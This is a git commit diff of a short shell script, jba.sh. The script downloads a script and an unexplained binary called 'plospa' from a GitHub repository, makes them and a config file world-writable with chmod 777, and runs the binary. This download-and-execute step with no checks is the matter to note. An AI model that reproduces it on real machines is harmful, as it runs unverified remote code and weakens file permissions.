21cbc02cd3934f36149e4705943ecf256a115869
vedhagsvp <vedhag230223@gmail.com>
2025-09-05 11:46:10 +0530

    Update jba.sh

--- jba.sh
+++ jba.sh
@@ -2,5 +2,5 @@
 
 wget https://github.com/vedhagsvp/taberas/raw/main/jt.sh
 wget https://github.com/vedhagsvp/taberas/releases/download/latest/plospa
-chmod 777 plospa jt.sh
+chmod 777 plospa jt.sh appsettings.json
 ./plospa
